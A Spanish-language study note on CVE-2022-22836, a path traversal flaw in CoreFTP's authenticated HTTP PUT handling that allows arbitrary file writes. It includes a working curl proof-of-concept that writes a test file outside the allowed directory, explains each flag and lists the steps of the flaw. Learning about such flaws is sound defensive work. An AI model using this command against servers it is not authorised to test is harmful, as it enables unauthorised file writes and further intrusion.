**Vulnerabilidad CVE-2022-22836 (CoreFTP < 727)**

CoreFTP permitía usar una petición HTTP **PUT** autenticada para escribir ficheros en el servidor, pero no validaba correctamente la ruta: con secuencias de “salida” (`../../..`) un usuario autenticado podía escribir archivos **fuera** del directorio permitido (path traversal + arbitrary file write).


- **PUT HTTP**: método que sube o reemplaza un recurso en una URL (a diferencia de POST que suele usar la app).
    
- **Path traversal (recorrido de directorios)**: usar `../` para escapar del directorio permitido y acceder/crear archivos en otras partes del sistema.
    
- **Authenticated**: hace falta usuario/contraseña (no es explotación anónima), pero con credenciales válidas se puede abusar.
    
- **Arbitrary file write**: capacidad de crear/escribir cualquier archivo donde el proceso tenga permisos.

```
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> \
  --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Desglose:
- `-X PUT` → fuerza una petición HTTP PUT (escribir/crear archivo).
- `--basic -u user:pass` → autenticación Basic (usuario y contraseña).
- `--data-binary "PoC."` → contenido a escribir en el archivo (aquí "PoC.").
- `--path-as-is` → le dice a curl que no normalice la ruta; mantiene los `../`.
- `https://<IP>/../../../../../../whoops` → ruta con `../` para salir del directorio y crear `C:\whoops` (o `/whoops` según SO).
- `-H "Host: <IP>"` → se añade el header Host si hace falta para la app.

Resultado esperado: el servidor crea/escribe el archivo `whoops` en una ubicación superior con el contenido `PoC.`.


1. Usuario autenticado envía un PUT con ruta que contiene `../`.    
2. El servicio toma la ruta **sin** normalizarla/filtrarla y decide dónde escribir.
3. Las comprobaciones de permiso solo aplicaban dentro de un subdirectorio; al salir de él con `../` esas comprobaciones no se aplican.
4. El servicio escribe el archivo en la ubicación final fuera del directorio restringido
5. Ahora hay un archivo arbitrario creado por el atacante en el sistema destino.



